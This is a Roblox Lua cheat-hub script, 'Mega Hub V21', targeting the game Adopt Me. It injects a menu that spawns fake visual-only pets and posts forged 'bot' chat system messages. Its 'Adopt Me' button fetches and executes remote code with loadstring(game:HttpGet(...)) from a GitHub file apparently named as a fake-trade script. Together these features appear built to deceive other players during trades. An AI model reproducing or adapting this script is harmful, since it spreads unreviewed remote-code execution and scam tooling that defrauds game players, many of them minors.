-- [[ MEGA HUB V21: MFR & NFR SUPPORT ]] --
local CoreGui = game:GetService("CoreGui")
local Players = game:GetService("Players")
local LP = Players.LocalPlayer
local UIS = game:GetService("UserInputService")
local RS = game:GetService("ReplicatedStorage")
local StarterGui = game:GetService("StarterGui")

if CoreGui:FindFirstChild("MegaHubV21") then CoreGui.MegaHubV21:Destroy() end
local ScreenGui = Instance.new("ScreenGui", CoreGui)
ScreenGui.Name = "MegaHubV21"

-- --- BOT REACTION LOGIC ---
local BotNames = {"SurenArmen", "Aura_Dev", "Gus_Leaker", "AdoptMeFan"}
local function BotReact(emoji)
    local randomBot = BotNames[math.random(1, #BotNames)]
    StarterGui:SetCore("ChatMakeSystemMessage", {
        Text = "[Bot] " .. randomBot .. " reacted: " .. emoji;
        Color = Color3.fromRGB(255, 255, 255);
        Font = Enum.Font.GothamBold;
    })
end

-- --- SEPARATE SPAWNER WINDOW ---
local SpawnerWin = Instance.new("Frame", ScreenGui)
SpawnerWin.Size = UDim2.new(0, 380, 0, 340)
SpawnerWin.Position = UDim2.new(0.6, 0, 0.3, 0)
SpawnerWin.BackgroundColor3 = Color3.fromRGB(35, 38, 47)
SpawnerWin.BorderSizePixel = 2 SpawnerWin.BorderColor3 = Color3.fromRGB(0, 255, 200)
SpawnerWin.Visible = false SpawnerWin.Active = true SpawnerWin.Draggable = true
Instance.new("UICorner", SpawnerWin)

local SHead = Instance.new("TextLabel", SpawnerWin)
SHead.Size = UDim2.new(1, 0, 0, 35) SHead.Text = "Pets  Jaradz Library  Toys"
SHead.TextColor3 = Color3.new(1,1,1) SHead.BackgroundTransparency = 1

local SInput = Instance.new("TextBox", SpawnerWin)
SInput.Size = UDim2.new(0.9, 0, 0, 40) SInput.Position = UDim2.new(0.05, 0, 0.15, 0)
SInput.PlaceholderText = "Enter Pet Name to Spawn" SInput.BackgroundColor3 = Color3.fromRGB(45, 47, 52)
SInput.TextColor3 = Color3.new(1,1,1) Instance.new("UICorner", SInput)

local StatusText = Instance.new("TextLabel", SpawnerWin)
StatusText.Size = UDim2.new(1, 0, 0, 20) StatusText.Position = UDim2.new(0, 0, 0.92, 0)
StatusText.Text = "Ready..." StatusText.TextColor3 = Color3.new(0.7, 0.7, 0.7)
StatusText.BackgroundTransparency = 1 StatusText.TextSize = 12

-- Multi-Selection Logic
local activeModes = {F = false, R = false, N = false, M = false}
local function getModeString()
    local s = ""
    if activeModes.M then s = "M" elseif activeModes.N then s = "N" end
    if activeModes.F then s = s .. "F" end
    if activeModes.R then s = s .. "R" end
    return s
end

local frnm = Instance.new("Frame", SpawnerWin)
frnm.Size = UDim2.new(0.9, 0, 0, 40) frnm.Position = UDim2.new(0.05, 0, 0.35, 0) frnm.BackgroundTransparency = 1
Instance.new("UIListLayout", frnm).FillDirection = "Horizontal"

local function B(t, c)
    local b = Instance.new("TextButton", frnm)
    b.Size = UDim2.new(0.25, -5, 1, 0) b.Text = t b.TextColor3 = Color3.new(1,1,1)
    b.BackgroundColor3 = Color3.fromRGB(30, 30, 30) b.BorderColor3 = c b.BorderSizePixel = 2
    b.MouseButton1Click:Connect(function()
        activeModes[t] = not activeModes[t]
        -- Handle M and N mutually exclusive (can't be both)
        if t == "M" and activeModes.M then activeModes.N = false end
        if t == "N" and activeModes.N then activeModes.M = false end
        
        b.BackgroundColor3 = activeModes[t] and Color3.fromRGB(60, 60, 60) or Color3.fromRGB(30, 30, 30)
        StatusText.Text = "Current Mode: " .. getModeString()
    end)
end
B("F", Color3.new(0, 0.6, 1)) B("R", Color3.new(1, 0, 0.6)) B("N", Color3.new(0, 1, 0.4)) B("M", Color3.new(0.6, 1, 0))

local SpawnBtn = Instance.new("TextButton", SpawnerWin)
SpawnBtn.Size = UDim2.new(0.9, 0, 0, 40) SpawnBtn.Position = UDim2.new(0.05, 0, 0.75, 0)
SpawnBtn.Text = "Spawn Pet (Visual)" SpawnBtn.BackgroundColor3 = Color3.fromRGB(0, 100, 200) SpawnBtn.TextColor3 = Color3.new(1,1,1)
Instance.new("UICorner", SpawnBtn)

SpawnBtn.MouseButton1Click:Connect(function()
    local fullName = getModeString() .. " " .. SInput.Text
    StatusText.Text = "Added " .. fullName .. " to Visual Inventory"
    local fakePet = Instance.new("Tool")
    fakePet.Name = fullName
    fakePet.Parent = LP:WaitForChild("Backpack")
end)

-- --- MAIN HUB CONTAINER ---
local Main = Instance.new("Frame", ScreenGui)
Main.Size = UDim2.new(0, 520, 0, 380) Main.Position = UDim2.new(0.5, -260, 0.2, 0)
Main.BackgroundColor3 = Color3.fromRGB(25, 25, 25) Main.Active = true Main.Draggable = true
Instance.new("UICorner", Main)

local Side = Instance.new("Frame", Main)
Side.Size = UDim2.new(0, 150, 1, -40) Side.Position = UDim2.new(0, 0, 0, 40)
Side.BackgroundColor3 = Color3.fromRGB(20, 20, 20) Instance.new("UICorner", Side)

local Content = Instance.new("ScrollingFrame", Main)
Content.Size = UDim2.new(1, -170, 1, -60) Content.Position = UDim2.new(0, 160, 0, 50)
Content.BackgroundTransparency = 1 
local Layout = Instance.new("UIListLayout", Content) Layout.Padding = UDim.new(0, 10)

local function Nav(txt, func)
    local b = Instance.new("TextButton", Side)
    b.Size = UDim2.new(1, 0, 0, 50) b.Text = txt b.TextColor3 = Color3.new(1,1,1) b.BackgroundTransparency = 1
    b.MouseButton1Click:Connect(func)
end

Nav("🐾 Adopt Me", function() loadstring(game:HttpGet("https://raw.githubusercontent.com/xxyourfuckasssoulxxilly/daisyscripts/refs/heads/main/esnafaketrade.lua"))() end)
Nav("⚙️ Misc", function() 
    for _,v in pairs(Content:GetChildren()) do if not v:IsA("UIListLayout") then v:Destroy() end end
    local b = Instance.new("TextButton", Content)
    b.Size = UDim2.new(0.95, 0, 0, 50) b.Text = "Execute Spawner" b.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
    b.TextColor3 = Color3.new(1,1,1) Instance.new("UICorner", b)
    b.MouseButton1Click:Connect(function() SpawnerWin.Visible = true end)
end)

-- --- EMOJI BAR ---
local EBar = Instance.new("Frame", ScreenGui)
EBar.Size = UDim2.new(0, 340, 0, 45) EBar.Position = UDim2.new(0.5, -170, 0.85, 0)
EBar.BackgroundColor3 = Color3.new(1,1,1) Instance.new("UICorner", EBar) EBar.Draggable = true
local eL = Instance.new("UIListLayout", EBar) eL.FillDirection = "Horizontal" eL.HorizontalAlignment = "Center" eL.VerticalAlignment = "Center" eL.Padding = UDim.new(0, 12)
for _, e in pairs({"👍", "😲", "💯", "👀", "🔥", "❤️", "🎉"}) do
    local b = Instance.new("TextButton", EBar)
    b.Size = UDim2.new(0, 32, 0, 32) b.Text = e b.TextSize = 25 b.BackgroundTransparency = 1
    b.MouseButton1Click:Connect(function() BotReact(e) end)
end
